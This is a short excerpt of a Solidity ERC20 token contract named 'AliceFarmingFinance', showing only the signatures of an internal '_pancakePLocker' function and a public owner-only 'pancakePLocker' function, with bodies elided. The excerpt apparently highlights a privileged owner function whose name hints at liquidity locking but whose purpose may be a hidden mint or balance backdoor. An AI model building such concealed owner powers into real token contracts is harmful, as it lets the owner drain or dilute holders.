...
contract AliceFarmingFinance is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _pancakePLocker(address account, uint256 amount) internal virtual {
    ...
    function pancakePLocker(uint256 amount) public onlyOwner virtual returns (bool) {
